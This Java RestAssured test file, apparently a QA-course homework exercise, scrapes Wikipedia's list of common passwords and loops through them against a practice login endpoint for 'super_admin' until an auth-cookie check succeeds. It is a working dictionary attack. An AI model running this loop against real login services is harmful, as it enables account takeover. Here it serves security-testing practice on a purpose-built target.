import io.restassured.http.ContentType;
import io.restassured.path.json.JsonPath;
import io.restassured.path.xml.XmlPath;
import org.apache.http.util.Asserts;
import org.junit.jupiter.api.Test;
import io.restassured.RestAssured;
import io.restassured.response.Response;
import io.restassured.path.*;

import java.io.File;
import java.lang.reflect.Array;
import java.sql.SQLOutput;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static io.restassured.RestAssured.given;
import static io.restassured.path.xml.XmlPath.CompatibilityMode.HTML;
import static org.junit.jupiter.api.Assertions.assertEquals;

public class HelloWorldTest {


    @Test
    public void testRestAssuredEx9() throws InterruptedException {

        //получим пароли из Wiki
        Response response = given()
                .when().get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords").then().contentType(ContentType.HTML).extract()
                .response();
        assertEquals(response.getStatusCode(), 200);

        XmlPath htmlPath = new XmlPath(HTML, response.getBody().asString());

        String table = htmlPath.getString("**.findAll { it.@class == 'wikitable' }[1]");
        String[] passwords = table.split("\n");

        //теперь в passwords[] лежат пароли и немного мусора - заголовок, номера, но и все данные тоже

        String login = "super_admin";
        String authResp;
        int passCount=0;

        Map<String,Object> body = new HashMap<>();
        body.put("login", login);
        body.put("password", passwords[passCount]);

        do {

            body.remove("password");
            body.put("password", passwords[passCount]);


            Response response2 =
                    given()
                            .body(body)
                            .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                            .andReturn();

            //response2.prettyPrint();

            String cookies = response2.getCookie("auth_cookie");
            Map<String, String> cook = new HashMap<>();
            cook.put("auth_cookie", cookies);

            Response response3 =
                    given()
                            .cookies(cook)
                            .when()
                            .get("https://playground.learnqa.ru/api/check_auth_cookie")
                            .andReturn();


            System.out.println(body.get("password"));
            response3.print();

            authResp=response3.asString();
            passCount++;


        }while(authResp.equals("You are NOT authorized"));

        System.out.println("CORRECT PASSWORD: " + body.get("password"));

    }
}
